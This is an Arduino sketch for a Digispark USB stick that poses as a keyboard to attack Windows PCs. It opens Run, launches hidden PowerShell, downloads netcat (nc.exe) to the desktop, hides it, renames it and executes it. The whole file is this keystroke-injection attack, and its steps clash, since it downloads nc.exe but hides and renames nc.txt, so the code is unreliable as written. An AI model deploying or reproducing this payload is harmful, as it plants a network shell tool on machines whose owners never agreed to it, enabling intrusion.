#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadFile(@http://nc.exe@,@$env:UserProfile<desktop<nc.exe@)");
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("(attrib +h $env:UserProfile<desktop<nc.txt)");  
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(Rename-Item $env:UserProfile<desktop<nc.txt nc.exe)");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(invoke-item $env:UserProfile<desktop<nc.exe)");
  DigiKeyboard.delay(100);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
